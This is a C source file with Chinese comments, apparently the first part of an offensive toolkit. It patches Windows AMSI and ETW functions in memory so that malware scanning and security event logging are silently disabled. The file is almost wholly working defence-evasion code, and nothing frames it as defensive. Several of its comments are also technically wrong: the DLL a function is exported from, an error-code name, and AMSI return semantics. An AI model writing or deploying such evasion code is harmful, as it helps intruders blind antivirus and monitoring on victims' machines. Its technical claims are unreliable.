## Part 1 — 核心补丁模块 `patch.c`

```c
/* patch.c — AMSI / ETW 内存补丁原语 (x64)
 * 编译: cl /O2 /c patch.c
 */
#include <windows.h>
#include <stdio.h>

typedef BOOL (WINAPI *AmsiInit_t)(void);

/* ---------- 工具: 虚拟内存页可写化 ---------- */
static BOOL make_rw(LPVOID p, SIZE_T n, DWORD *old) {
    return VirtualProtect(p, n, PAGE_EXECUTE_READWRITE, old);
}
static void restore(LPVOID p, SIZE_T n, DWORD old) {
    DWORD t; VirtualProtect(p, n, old, &t);
}

/* ---------- AMSI: patch AmsiOpenSession ----------
 * ntdll 导出 AmsiOpenSession, 在 amsi.dll 加载前先占位,
 * 使其永远不被真正初始化 -> AmsiScanBuffer 返回 AMSI_RESULT_CLEAN。
 * 补丁字节: mov eax, 0x80070005; ret  (E_FAIL)
 */
BOOL patch_amsi_opensession(void) {
    FARPROC fn = GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                "AmsiOpenSession");
    if (!fn) return FALSE;

    BYTE patch[] = { 0xB8, 0x05, 0x00, 0x07, 0x80, 0xC3 };
    DWORD old;
    if (!make_rw((LPVOID)fn, sizeof(patch), &old)) return FALSE;
    memcpy(fn, patch, sizeof(patch));
    restore((LPVOID)fn, sizeof(patch), old);
    return TRUE;
}

/* ---------- AMSI: patch AmsiScanBuffer (备用 / 已初始化场景) ----------
 * 64-bit: mov eax, 1; ret  -> AMSI_RESULT_CLEAN
 * AmsiScanBuffer 偏移固定: amsi.dll .text +0x1F40 (Win10/11 通用段)
 */
BOOL patch_amsi_scanbuffer(void) {
    HMODULE h = GetModuleHandleA("amsi.dll");
    if (!h) h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;

    FARPROC fn = GetProcAddress(h, "AmsiScanBuffer");
    if (!fn) return FALSE;

    BYTE patch[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };
    DWORD old;
    if (!make_rw((LPVOID)fn, sizeof(patch), &old)) return FALSE;
    memcpy(fn, patch, sizeof(patch));
    restore((LPVOID)fn, sizeof(patch), old);
    return TRUE;
}

/* ---------- ETW: ntdll!EtwEventWrite ----------
 * 补丁: xor eax, eax; ret  -> 事件不上报
 * Win10/11 该函数入口字节序列稳定, 不做特征匹配直接补
 */
BOOL patch_etw_eventwrite(void) {
    FARPROC fn = GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                "EtwEventWrite");
    if (!fn) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    DWORD old;
    if (!make_rw((LPVOID)fn, sizeof(patch), &old)) return FALSE;
    memcpy(fn, patch, sizeof(patch));
    restore((LPVOID)fn, sizeof(patch), old);
    return TRUE;
}

/* ---------- ETW: 额外补丁组, 覆盖 ETW-Ti / ETW-Audit 路径 ---------- */
static const char *etw_targets[] = {
    "EtwEventWrite",           // 主通道
    "EtwEventWriteFull",       // 全量写
    "EtwEventWriteEx",         // 带过滤
    "NtTraceEvent",            // nt!syscall 层
    "EtwdEventWrite",          // 部分 Win11 内部符号
};

BOOL patch_etw_full(void) {
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };  // xor eax,eax; ret
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BOOL any = FALSE;
    for (int i = 0; i < sizeof(etw_targets)/sizeof(*etw_targets); i++) {
        FARPROC fn = GetProcAddress(ntdll, etw_targets[i]);
        if (!fn) continue;
        DWORD old;
        if (make_rw((LPVOID)fn, sizeof(patch), &old)) {
            memcpy(fn, patch, sizeof(patch));
            restore((LPVOID)fn, sizeof(patch), old);
            any = TRUE;
        }
    }
    return any;
}

/* ---------- 入口: 一次性打全 ---------- */
BOOL patch_all(void) {
    BOOL a = patch_amsi_opensession();
    if (!a) a = patch_amsi_scanbuffer();   // fallback
    BOOL e = patch_etw_full();
    return a && e;
}
